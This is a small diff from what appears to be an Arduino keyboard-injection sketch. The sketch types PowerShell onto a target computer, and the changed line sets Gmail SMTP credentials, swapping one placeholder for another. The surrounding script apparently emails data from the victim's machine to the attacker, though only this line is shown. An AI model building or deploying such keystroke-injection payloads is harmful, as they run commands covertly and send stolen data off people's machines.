@@ -98,7 +98,7 @@ void setup()
 
   typeKey(KEY_RETURN);
 
-  Keyboard.print("$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('CHANGE_THIS_GMAIL_ADDRESS@gmail.com', 'CHANGE_THIS_TO_EMAIL_PASSWORD')");
+  Keyboard.print("$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('CHANGE_THIS_GMAIL_ADDRESS@gmail.com', 'CHANGE_THIS_TO_GMAIL_PASSWORD')");
 
   typeKey(KEY_RETURN);
 
